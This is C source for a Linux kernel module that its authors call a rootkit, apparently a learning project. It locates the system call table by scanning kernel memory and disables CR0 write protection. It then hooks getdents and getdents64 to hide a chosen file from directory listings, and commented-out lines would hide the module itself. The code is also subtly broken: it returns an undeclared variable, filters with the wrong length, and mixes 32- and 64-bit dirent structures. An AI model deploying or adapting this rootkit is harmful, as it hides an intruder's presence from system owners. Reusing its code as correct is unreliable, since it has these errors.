#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/string.h> 
//#include "export.h"

/*************** Module description ********************/
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Xincheng and Matthew");
MODULE_DESCRIPTION("Rootkit main entry"); 

/*************** Methods declaration ********************/
// Hook system call table and hide file by name
static unsigned long **hook_syscall_table(void);
static long hide_file(char *f_name, struct linux_dirent __user *dirp, long count);
// Kernel system call
asmlinkage long (*kernel_getdents)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
asmlinkage long (*kernel_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
// Faked system call
asmlinkage long fake_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
asmlinkage long fake_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);

/*************** What file we gonna hide ********************/
static char* targetfile = "TestRootkitHide.txt";

/*
 * Disable write protection for hook system call table
 */
#define DISABLE_WRITE_PROTECTION (write_cr0(read_cr0() & (~ 0x10000)))
#define ENABLE_WRITE_PROTECTION (write_cr0(read_cr0() | 0x10000))
asmlinkage unsigned long **syscall_table;

 
static int lkm_init(void)
{
    //Hide this module from kernel modules(lsmod | grep [module]) 
    //list_del_init(&__this_module.list);

    //Hide this module from /sys/module
    //kobject_del(&THIS_MODULE->mkobj.kobj);
    printk("Hello world, our rootkit module successfully loaded\n");
    syscall_table = hook_syscall_table();
    
    DISABLE_WRITE_PROTECTION;
    kernel_getdents = (void *)syscall_table[__NR_getdents]; 
    kernel_getdents64 = (void *)syscall_table[__NR_getdents64]; 
    syscall_table[__NR_getdents] = (unsigned long *)fake_getdents;
    syscall_table[__NR_getdents64] = (unsigned long *)fake_getdents64;
    ENABLE_WRITE_PROTECTION;
    
    return 0;    
}

/**
 * @brief This is the function to hook system call table
 * Before replace the original system call, we need to disable the system call table write protection.
 * @return the entry(array) of system call table
 */
unsigned long ** hook_syscall_table(void)
{
    unsigned long **entry = (unsigned long **)PAGE_OFFSET;

    for (;(unsigned long)entry < ULONG_MAX; entry += 1) {
        if (entry[__NR_close] == (unsigned long *)sys_close) {
            return entry;
        }
    }

    return NULL;
}


/**
 * @brief Hide a specified file use linux_dirent
 * @param f_name : the file we want to hide 
 * @param dirp : the structure dirent which point to a specified file(inode) 
 * @param count : the size of this structure
 * @return 
 */
static long hide_file(char *f_name, struct linux_dirent __user *dirp, long count)
{
    struct linux_dirent *dp;
    long cur_addr, cur_reclen;
    unsigned long remain, next_addr;

    for (cur_addr = 0, dp = dirp; cur_addr < count; ) {
        if (strncmp(dp->d_name, f_name, strlen(f_name)) == 0) {
            cur_reclen = dp->d_reclen;                              // Store the current length
            next_addr = (unsigned long)dp + dp->d_reclen;           // Next address = current+len
            remain = (unsigned long)dirp + count - next_addr;        // Remain size = initial+size-next size
            
            memmove(dp, (void *)next_addr, remain);                 // current dirent point to the next
            count -= cur_reclen;                                     // Modify the size
            
            printk("Hide %s success.\n", dp->d_name);
        }
        
        cur_addr += dp->d_reclen;                                   // Current add the size to the next
        dp = (struct linux_dirent *)((unsigned long)dirp + cur_addr);
    }

    return size;
}

asmlinkage long fake_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
{
    long rv;
    
    rv = kernel_getdents(fd, dirp, count);
    rv = hide_file(targetfile, dirp, count);
    
    return rv;
}

asmlinkage long fake_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)
{
    long rv;
    
    rv = hide_file(targetfile, dirp, count);
    rv = kernel_getdents64(fd, dirp, count);
   
    return rv;
}
 
static void lkm_exit(void)
{
    printk("Hello world, our rootkit module removed\n");
    
    // Recover the original system call setting
    DISABLE_WRITE_PROTECTION;
    syscall_table[__NR_getdents] = (unsigned long *)kernel_getdents;
    syscall_table[__NR_getdents64] = (unsigned long *)kernel_getdents64;
    ENABLE_WRITE_PROTECTION;
}
 
module_init(lkm_init);
module_exit(lkm_exit);